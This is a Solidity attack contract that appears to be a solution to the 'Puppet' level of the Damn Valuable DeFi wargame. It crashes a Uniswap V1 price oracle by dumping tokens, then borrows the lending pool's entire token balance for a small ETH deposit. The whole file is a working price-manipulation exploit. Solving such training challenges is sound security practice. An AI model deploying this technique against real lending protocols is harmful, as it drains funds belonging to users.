// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../puppet/PuppetPool.sol";
import "../DamnValuableToken.sol";
interface UniV1 {
	function tokenToEthSwapInput(uint256, uint256, uint256) external returns (uint256);
}
contract PuppetAttacker {
	UniV1 public uni;
	PuppetPool public pool;
	constructor (address _uni, address _pool) {
		uni = UniV1(_uni);
		pool = PuppetPool(_pool);
	}
	function attack(address token) external payable {
		DamnValuableToken(token).approve(address(uni), 999 * 10**18);
		uint256 output = uni.tokenToEthSwapInput(
			999 * 10**18, 
			1, 
			block.timestamp + 100
		);
		require(output > 9 * 10 ** 18, "should be more than 9 eth");
		uint256 x = DamnValuableToken(token).balanceOf(address(pool));
		require(pool.calculateDepositRequired(x) <= address(this).balance, "not enough eth");
		pool.borrow{value : 34 * 10**18}(x);
		DamnValuableToken(token).transfer(msg.sender, x);
	}

	receive() external payable {
	}
}